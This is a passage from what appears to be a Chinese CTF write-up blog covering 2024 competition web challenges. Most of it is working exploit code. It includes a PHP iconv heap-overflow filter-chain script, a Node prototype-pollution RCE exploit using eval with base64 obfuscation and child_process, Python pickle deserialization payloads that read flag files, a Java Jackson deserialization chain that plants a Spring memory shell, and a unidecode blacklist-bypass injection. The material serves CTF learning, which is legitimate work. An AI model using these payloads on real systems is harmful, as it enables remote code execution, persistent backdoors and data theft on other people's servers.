class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> self.sleep:<br>            COMMAND = <span class="hljs-string">f&quot;sleep <span class="hljs-subst">&#123;self.sleep&#125;</span>; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        COMMAND = COMMAND.encode() + <span class="hljs-string">b&quot;\x00&quot;</span><br><br>        <span class="hljs-keyword">assert</span> (<br>                <span class="hljs-built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size<br>        ), <span class="hljs-string">f&quot;Command too big (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span><br>        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>        step4_use_custom_heap = COMMAND<br>        step4_use_custom_heap = qpe(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)<br><br>        pages = (<br>                step4 * <span class="hljs-number">3</span><br>                + step4_pwn<br>                + step4_custom_heap<br>                + step4_use_custom_heap<br>                + step3_overflow<br>                + pad * self.pad<br>                + step1 * <span class="hljs-number">3</span><br>                + step2_write_ptr<br>                + step2 * <span class="hljs-number">2</span><br>        )<br><br>        resource = compress(compress(pages))<br>        resource = b64(resource)<br>        resource = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;resource.decode()&#125;</span>&quot;</span><br><br>        filters = [<br>            <span class="hljs-comment"># Create buckets</span><br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br><br>            <span class="hljs-comment"># Step 0: Setup heap</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br><br>            <span class="hljs-comment"># Step 1: Reverse FL order</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br><br>            <span class="hljs-comment"># Step 2: Put fake pointer and make FL order back to normal</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br><br>            <span class="hljs-comment"># Step 3: Trigger overflow</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,<br><br>            <span class="hljs-comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span><br>            <span class="hljs-string">&quot;convert.quoted-printable-decode&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>        ]<br>        filters = <span class="hljs-string">&quot;|&quot;</span>.join(filters)<br>        path = <span class="hljs-string">f&quot;php://filter/read=<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;resource&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">return</span> path<br><br><span class="hljs-meta">    @inform(<span class="hljs-params"><span class="hljs-string">&quot;Triggering...&quot;</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        path = self.build_exploit_path()<br>        start = time.time()<br><br>        <span class="hljs-keyword">try</span>:<br>            self.remote.send(path)<br>        <span class="hljs-keyword">except</span> (ConnectionError, ChunkedEncodingError):<br>            <span class="hljs-keyword">pass</span><br><br>        msg_print()<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.sleep:<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> start + self.sleep &lt;= time.time():<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span><br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)<br><br>        msg_print()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">data</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># Remove 2-byte header and 4-byte checksum</span><br>    <span class="hljs-keyword">return</span> zlib.compress(data, <span class="hljs-number">9</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">4</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b64</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, misalign=<span class="hljs-literal">True</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    payload = base64.encode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> misalign <span class="hljs-keyword">and</span> payload.endswith(<span class="hljs-string">&quot;=&quot;</span>):<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Misaligned: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload.encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compressed_bucket</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> chunked_chunk(data, <span class="hljs-number">0x8000</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">qpe</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">f&quot;=<span class="hljs-subst">&#123;x:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data).upper().encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ptr_bucket</span>(<span class="hljs-params">*ptrs, size=<span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ptrs) * <span class="hljs-number">8</span> == size<br>    bucket = <span class="hljs-string">b&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(p64, ptrs))<br>    bucket = qpe(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = compressed_bucket(bucket)<br><br>    <span class="hljs-keyword">return</span> bucket<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chunked_chunk</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        size = <span class="hljs-built_in">len</span>(data) + <span class="hljs-number">8</span><br>    keep = <span class="hljs-built_in">len</span>(data) + <span class="hljs-built_in">len</span>(<span class="hljs-string">b&quot;\n\n&quot;</span>)<br>    size = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="hljs-string">&quot;0&quot;</span>)<br>    <span class="hljs-keyword">return</span> size.encode() + <span class="hljs-string">b&quot;\n&quot;</span> + data + <span class="hljs-string">b&quot;\n&quot;</span><br><br><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Region</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span><br><br>    start: <span class="hljs-built_in">int</span><br>    stop: <span class="hljs-built_in">int</span><br>    permissions: <span class="hljs-built_in">str</span><br>    path: <span class="hljs-built_in">str</span><br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">size</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> self.stop - self.start<br><br><br>Exploit()<br></code></pre></td></tr></table></figure><h2 id="notadmin-pcb2024"><a href="#notadmin-pcb2024" class="headerlink" title="notadmin-pcb2024"></a>notadmin-pcb2024</h2><p>js原型链污染</p><p><img src="/img/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF/1.png" alt="1"></p><p>过滤了一堆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/const|var|let|<span class="hljs-keyword">return</span>|subprocess|Array|constructor|load|push|mainModule|<span class="hljs-keyword">from</span>|buffer|process|child_process|main|require|<span class="hljs-built_in">exec</span>|this|<span class="hljs-built_in">eval</span>|<span class="hljs-keyword">while</span>|<span class="hljs-keyword">for</span>|function|<span class="hljs-built_in">hex</span>|char|base|<span class="hljs-string">&quot;|&#x27;|\\|\[|\+|\*/ig</span><br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">merge</span>(tmp_user, req.<span class="hljs-property">body</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (tmp_user.<span class="hljs-property">secretKey</span> == <span class="hljs-literal">undefined</span>) &#123;<br>      tmp_user.<span class="hljs-property">secretKey</span> = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">User</span>.<span class="hljs-title function_">verifyLogin</span>(tmp_user.<span class="hljs-property">password</span>)) &#123;<br>      <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">username</span>: tmp_user.<span class="hljs-property">username</span> &#125;, tmp_user.<span class="hljs-property">secretKey</span>);<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`Login successful! Token: <span class="hljs-subst">$&#123;token&#125;</span>\nBut nothing happend~`</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Login failed!&#x27;</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Hacker denied!&quot;</span>)<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-title function_">authenticateToken</span>(req, res, <span class="hljs-function">() =&gt;</span> &#123;<br>    backcode = <span class="hljs-built_in">eval</span>(tmp_user.<span class="hljs-property">code</span>)<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;something happend~&quot;</span>)<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>&#x2F;login路由可以进行污染，在根路由有个eval，会调用tmp_user.code，只需要污染出一个code属性就可以rce了。</p><p>第一步是登录，不然在authenticateToken函数里会被踢出来。</p><p>可以直接污染key，让python签一个jwt，带着token去访问根路由，就可以执行命令了。</p><p>这里用反引号来代替引号，乱七八糟的字符可以直接用atob来base64加密绕过。那么就需要一层解密，只需要再获取一次eval就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Reflect.get(global,Reflect.ownKeys(global).find(x=&gt;x.includes(`eva`)))(atob(`&#123;payload_b64&#125;`))<br></code></pre></td></tr></table></figure><p>虽然不出网，但是app.use(express.static(‘public’));暴露了public作为static静态目录，可以直接往这里面写。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;cat /flag &gt; ./public/flag.txt&quot;)<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://192.168.18.21&quot;</span><br>key = <span class="hljs-string">&#x27;123456&#x27;</span><br><br><span class="hljs-comment">#签一个token</span><br>data = &#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;<br>token = jwt.encode(data,key,algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br><span class="hljs-comment">#print(token)</span><br><br>payload = <span class="hljs-string">&#x27;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;cat /flag &gt; ./public/flag.txt&quot;)&#x27;</span><br>payload_b64 = base64.b64encode(payload.encode()).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-comment">#print(payload_b64)</span><br><br><span class="hljs-comment">#污染</span><br>json = &#123;<br>    <span class="hljs-string">&quot;secretKey&quot;</span>:key,<br>    <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">f&quot;Reflect.get(global,Reflect.ownKeys(global).find(x=&gt;x.includes(`eva`)))(atob(`<span class="hljs-subst">&#123;payload_b64&#125;</span>`))&quot;</span>   <span class="hljs-comment">#两层eval，外面的eval执行，里面的eval解密</span><br>&#125;<br>requests.post(url+<span class="hljs-string">&quot;/login&quot;</span>,json=json)<br><br><span class="hljs-comment">#执行</span><br>requests.get(url,headers=&#123;<span class="hljs-string">&quot;Authorization&quot;</span>:token&#125;)<br><br><span class="hljs-comment">#读取flag</span><br>res = requests.get(url+<span class="hljs-string">&quot;/flag.txt&quot;</span>)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="ez-python-pcb2024"><a href="#ez-python-pcb2024" class="headerlink" title="ez_python-pcb2024"></a>ez_python-pcb2024</h2><p>爆破账号密码为test&#x2F;123456</p><p>得到一个jwt，爆破key为a123456，签一个admin的token就可以进去protected了，提示：听说ser有点东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hhhhackme</span>(<span class="hljs-params">pickled</span>):<br>    data = base64.urlsafe_b64decode(pickled)<br>    deserialized = pickle.loads(data)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>是pickle反序列化，利用报错回显可以拿到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>, (<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read())&quot;</span>,))<br><br>a = A()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(a)))<br></code></pre></td></tr></table></figure><p>也可以盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> string.digits+string.ascii_lowercase:<br><br>        <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>():<br>            <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">exec</span>,(<span class="hljs-string">f&quot;if(open(&#x27;/flag&#x27;).read()[<span class="hljs-subst">&#123;i&#125;</span>]==&#x27;<span class="hljs-subst">&#123;x&#125;</span>&#x27;):a()&quot;</span>,)<br><br>        data = base64.b64encode(pickle.dumps(test())).decode()<br>        res = requests.post(<span class="hljs-string">&quot;http://192.168.18.23/ser&quot;</span>,json=&#123;<span class="hljs-string">&quot;pickled&quot;</span>:data&#125;,headers=&#123;<span class="hljs-string">&quot;Authorization&quot;</span>:<span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MTE0MzgyN30.e_mDxsbfK4iM9EMthTW_u83zzL0zlP2bY0NbLotD8nE&quot;</span>&#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;defined&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            <span class="hljs-built_in">print</span>(x,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="LookUP-pcb2024"><a href="#LookUP-pcb2024" class="headerlink" title="LookUP-pcb2024"></a>LookUP-pcb2024</h2><p>参考文章：</p><p><a href="https://www.cnblogs.com/Goo1/p/17592281.html">https://www.cnblogs.com/Goo1/p/17592281.html</a></p><p><a href="https://xz.aliyun.com/t/12966#toc-34">https://xz.aliyun.com/t/12966#toc-34</a></p><p><img src="/img/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF/image-20241109135212733.png" alt="image-20241109135212733"></p><p>黑名单ban了templatesimpl，又有jackson依赖，可以打二次反序列化</p><p>bad –&gt; jackson –&gt; signed –&gt; bad –&gt; jackson –&gt; templatesimpl</p><p>不出网，打spring内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> com.Utils.Util;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> com.Utils.Util.setValue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        overrideJackson();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">templates1</span> <span class="hljs-operator">=</span> Util.getTemplates(Util.file2ByteArray(<span class="hljs-string">&quot;C:\\Users\\13664\\Documents\\JavaUtils\\target\\classes\\com\\Memshell\\spring\\BehinderControllerShell.class&quot;</span>));<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">pojoNodeStableProxy</span> <span class="hljs-operator">=</span> Util.getPOJONodeStableProxy(jsonNodes1);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        setValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,pojoNodeStableProxy);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">templates2</span> <span class="hljs-operator">=</span> Util.second_serialize(badAttributeValueExpException);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates2);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">2</span>);<br>        setValue(badAttributeValueExpException1,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes2);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">serialize</span> <span class="hljs-operator">=</span> Util.serialize(badAttributeValueExpException1);<br>        System.out.println(serialize);<br>        <span class="hljs-comment">//Util.unserialize(serialize);</span><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">overrideJackson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.getCtClass(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br><span class="hljs-comment">//        writeReplace.setBody(&quot;return $0;&quot;);</span><br>        ctClass.writeFile();<br>        ctClass.toClass();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ezlaravel-pcb2024"><a href="#ezlaravel-pcb2024" class="headerlink" title="ezlaravel-pcb2024"></a>ezlaravel-pcb2024</h2><p><a href="https://github.com/joshuavanderpoll/CVE-2021-3129">https://github.com/joshuavanderpoll/CVE-2021-3129</a></p><p>laravel爆破反序列化链，rce12可以</p><p><img src="/img/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF/QQ_1731129058247.png" alt="QQ_1731129058247"></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2024</title>
    <link href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/"/>
    <url>/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h1><p>黑名单过滤了所有符号，只能在print里用字母和数字，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> check_for_blacklisted_symbols(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]):<br>    code = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">else</span>:<br>    code = <span class="hljs-string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]) + <span class="hljs-string">&quot;&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>但是由于unidecode函数，能够将 Unicode 字符转换为<strong>最相似的 ASCII 字符</strong>。</p><p>这里是先检测黑名单，再转化，那么我们可以找到与我们需要的字符最相似的字符，就可以绕过过滤，然后经过unidecode函数转化，就变成我们想要的ascii字符了。</p><p>然后由于这里是拼接字符串，我们可以逃逸出去执行任意python代码。</p><p>举个栗子：我传入<code>a&#39;)\nprint(&quot;Infernity&quot;)#</code>，经过拼接之后就变成了：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;a&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;Infernity&quot;</span>)</span></span>#<span class="hljs-string">&#x27;)</span><br></code></pre></td></tr></table></figure><p>就会回显<code>a</code>和<code>Infernity</code>。我们再把特殊字符找到它最相似的字符：比如<code>(</code>换成<code>⁽</code>，<code>#</code>换成<code>﹟</code>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>＇⁾\nprint⁽＂Infernity＂⁾﹟<br></code></pre></td></tr></table></figure><p><img src="/img/qwb2024/image-20241102125723325.png" alt="image-20241102125723325"></p><p>方便后续转换，这里贴一个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">text = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(text.replace(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;＿&#x27;</span>).replace(<span 